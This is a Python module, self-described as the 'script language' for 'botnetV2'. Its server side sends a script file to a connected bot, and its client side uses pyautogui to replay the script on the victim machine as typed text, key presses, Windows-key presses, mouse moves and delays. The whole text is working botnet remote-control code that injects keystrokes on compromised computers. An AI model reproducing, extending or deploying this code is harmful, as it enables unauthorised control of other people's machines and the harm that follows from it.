# script language for botnetV2
if isclient == False:
    try:
        script = cmd.split()[1].lower()
        script = open(script, 'r').read()
        send(client, str(script).encode('utf-8'))
        done = receive(client)
    except:
        script = ' '
        send(client, str(script).encode('utf-8'))
        done = receive(client)
        print(Fore.LIGHTRED_EX + 'usage: script <script file> | example: script script.txt' + Fore.RESET)
else:
    import pyautogui
    script = receive(server).decode('utf-8')
    for line in script.split('\n'):
        line = line.split()
        try:
            if line[0] == 'string':
                text = ' '
                string = text.join(line[1:])
                pyautogui.write(str(string), interval=0.01)
            elif line[0] == 'key':
                if len(line) == 2:
                    key = str(line[1])
                    try:
                        pyautogui.press(key)
                    except:
                        pass
                else:
                    pass
            elif line[0] == 'enter':
                try:
                    pyautogui.press('enter')
                except:
                    pass
            elif line[0] == 'gui':
                try:
                    pyautogui.press('win')
                except:
                    pass
            elif line[0] == 'setmouse':
                try:
                    location = line[1:]
                    location = ' '.join(location)
                    x, y = location.split()
                    x = int(x)
                    y = int(y)
                    pyautogui.moveTo(x, y)
                except:
                    pass
            elif line[0] == 'sleep':
                if len(line) <= 2:
                    delay = line[1]
                    try:
                        delay = int(delay)
                        time.sleep(delay)
                    except:
                        pass
                else:
                    time.sleep(1)
            else:
                pass
        except:
            pass
    send(server, b'done')